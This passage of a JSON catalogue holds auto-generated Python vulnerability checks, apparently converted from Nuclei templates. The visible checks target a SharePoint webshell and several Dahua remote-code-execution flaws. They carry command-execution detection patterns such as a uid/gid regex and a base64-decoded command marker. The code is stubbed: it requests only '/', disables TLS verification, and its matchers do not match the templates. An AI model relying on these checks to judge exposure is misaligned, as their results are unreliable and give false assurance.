result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: len(body) <= 160; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SharePoint Webshell - ToolShell\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sharepoint_toolshell_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "sharepoint",
          "webshell",
          "implant",
          "aspx",
          "backdoor",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dahua_bitmap_fileupload",
        "name": "Dahua Bitmap - File Upload Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "",
        "severity": "critical",
        "detection": "[OR] mot(s) '<soap:Envelope' / [OR] mot(s) '{{base64_decode(cmd)}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: rand_str",
            "default": "{{randstr}}"
          },
          {
            "name": "cmd",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: cmd",
            "default": "{{base64(to_lower(rand_text_alpha(6)))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-bitmap-fileupload\nName: Dahua Bitmap - File Upload Remote Code Execution\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_bitmap_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-bitmap-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua Bitmap - File Upload Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '<soap:Envelope' / [OR] mot(s) '{{base64_decode(cmd)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['<soap:Envelope', '{{base64_decode(cmd)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua Bitmap - File Upload Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_bitmap_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-bitmap-fileupload\nName: Dahua Bitmap - File Upload Remote Code Execution\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_bitmap_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-bitmap-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua Bitmap - File Upload Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '<soap:Envelope' / [OR] mot(s) '{{base64_decode(cmd)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['<soap:Envelope', '{{base64_decode(cmd)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua Bitmap - File Upload Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_bitmap_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "dahua",
          "file-upload",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dahua_eims_rce",
        "name": "Dahua EIMS - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Dahua EIMS capture_handle interface allows remote command execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'dns' | regex ['^success$']",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-eims-rce\nName: Dahua EIMS - Remote Command Execution\nSeverity: critical\nDescription: Dahua EIMS capture_handle interface allows remote command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_eims_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-eims-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua EIMS - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | regex ['^success$']\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', '^success$']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua EIMS - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_eims_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-eims-rce\nName: Dahua EIMS - Remote Command Execution\nSeverity: critical\nDescription: Dahua EIMS capture_handle interface allows remote command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_eims_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-eims-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua EIMS - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | regex ['^success$']\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', '^success$']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua EIMS - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_eims_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "dahua",
          "rce",
          "eims",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dahua_icc_getclassvalue_rce",
        "name": "Dahua 'GetClassValue' - Remote Code Execution",
        "language": "Python",
        "famille": "IoT",
        "description": "Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-icc-getclassvalue-rce\nName: Dahua 'GetClassValue' - Remote Code Execution\nSeverity: critical\nDescription: Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_icc_getclassvalue_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-icc-getclassvalue-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua 'GetClassValue' - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = 